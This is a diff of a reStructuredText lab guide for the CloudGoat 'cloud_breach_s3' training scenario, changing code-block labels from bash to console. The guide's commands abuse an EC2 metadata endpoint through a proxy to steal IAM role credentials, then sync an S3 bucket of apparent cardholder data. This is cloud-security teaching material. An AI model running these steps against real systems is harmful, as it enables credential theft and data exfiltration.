@@ -52,7 +52,7 @@ Build attacker machine
 ======================
 -  Install common packages
 
-   .. code:: bash
+   .. code:: console
 
      sudo apt-get update && sudo apt install -y ssh vim net-tools curl git python3-pip 
 
@@ -60,19 +60,19 @@ Build attacker machine
 
    -  Download the package
 
-      .. code:: bash
+      .. code:: console
 
          curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
 
    -  Unzip the installer
 
-      .. code:: bash
+      .. code:: console
 
          unzip awscliv2.zip
 
    -  Run the install program
 
-      .. code:: bash
+      .. code:: console
 
          sudo ./aws/install
 
@@ -80,25 +80,25 @@ Build attacker machine
 
    -  Terraform Prerequisites
 
-      .. code:: bash
+      .. code:: console
 
          sudo apt-get update && sudo apt-get install -y gnupg software-properties-common
 
    -  Add the HashiCorp GPG key
 
-      .. code:: bash
+      .. code:: console
 
          curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -
 
    -  Add the official HashiCorp Linux repository
 
-      .. code:: bash
+      .. code:: console
 
          sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"
 
    -  Update to add the repository, and install the Terraform CLI
   
-      .. code:: bash
+      .. code:: console
 
          sudo apt-get update && sudo apt-get install terraform
 
@@ -107,13 +107,13 @@ Install Cloudgoat
 -  Use git to clone the Cloudgoat repo to home directory and change to
    the new directory
 
-.. code:: bash     
+.. code:: console     
    
     git clone https://github.com/RhinoSecurityLabs/cloudgoat.git ~/cloudgoat && cd ~/cloudgoat
    
 -  Install the Cloudgoat dependencies
 
-.. code:: bash
+.. code:: console
 
     pip3 install -r ./core/python/requirements.txt && chmod u+x cloudgoat.py
 
@@ -123,13 +123,13 @@ Install Pacu
 -  Use git to clone the Pacu repo to home directory and change to the
    new directory
 
-.. code:: bash
+.. code:: console
 
     git clone https://github.com/RhinoSecurityLabs/pacu.git ~/pacu && cd ~/pacu
 
 -  Install the Pacu dependencies
  
-.. code:: bash      
+.. code:: console      
    
     pip3 install -r requirements.txt
 
@@ -143,19 +143,19 @@ Setup AWS Profile
 -  You will be prompted for
    ``Access Key ID, AWS Secret Access Key, Default region name, Default output format``
 
-.. code:: bash
+.. code:: console
 
     aws configure --profile cloudgoat
 
 -  Make the new aws profile your default
 
-.. code:: bash
+.. code:: console
 
    export AWS_PROFILE=cloudgoat
 
 -  Verify credentials are working
 
-.. code:: bash
+.. code:: console
 
     aws sts get-caller-identity
 
@@ -170,13 +170,13 @@ Setup Cloudgoat
   previous step which we called ``cloudgoat``. This is how cloudgoat
   will access AWS. 
       
-.. code:: bash
+.. code:: console
       
     ~/cloudgoat/cloudgoat.py config profile
 
 - Run Cloudgoat config whitlelist
    
-.. code:: bash
+.. code:: console
 
     ~/cloudgoat/cloudgoat.py config whitelist --auto
 
@@ -189,7 +189,7 @@ Create vulnerable infrastructure
 
 -  Run the attack scenario
 
-.. code:: bash
+.. code:: console
    
     ~/cloudgoat/cloudgoat.py create cloud_breach_s3
 
@@ -214,7 +214,7 @@ Steal Role
 -  Replace ``<ec2-ip-address>`` with the IP address from the previoues
    step to get a role name. 
 
-.. code:: bash
+.. code:: console
 
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
 
@@ -228,7 +228,7 @@ Steal Crendentials
 -  Replace ``<ec2-ip-address>`` and ``<ec2-role-name>`` from the
    previous steps to get the keys
 
-.. code:: bash
+.. code:: console
 
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'
 
@@ -273,7 +273,7 @@ Data Exfil
 
 -  Create a new aws profile with stolen credentials
 
-.. code:: bash
+.. code:: console
 
    aws configure --profile cloud_breach_s3
 
@@ -286,7 +286,7 @@ Data Exfil
 -  Manually add the ``aws_session_token`` to the aws credentails file
    (use i for insert mode then esc :wq to save and close)
 
-.. code:: bash
+.. code:: console
 
    vi  ~/.aws/credentials
 
@@ -295,7 +295,7 @@ Data Exfil
 
 -  Use aws cli to list buckets the stolen credentails have access to
 
-.. code:: bash
+.. code:: console
    
     aws s3 ls --profile cloud_breach_s3
    
@@ -306,14 +306,14 @@ Data Exfil
    home directory. Replace ``<bucket-name>`` with the bucket to download
    data
 
-.. code:: bash  
+.. code:: console  
    
    aws s3 sync s3://<bucket-name> ~/cardholder-data --profile cloud_breach_s3
 
 -  Change to home directory and perfom list to verify data was
    downloaded 
    
-.. code:: bash 
+.. code:: console 
    
     cd && ls
    
@@ -322,7 +322,7 @@ Data Exfil
 
 -  Remove vulnerable infrasturecure
 
-.. code:: bash 
+.. code:: console 
 
     ~/cloudgoat/cloudgoat.py destroy cloud_breach_s3
 
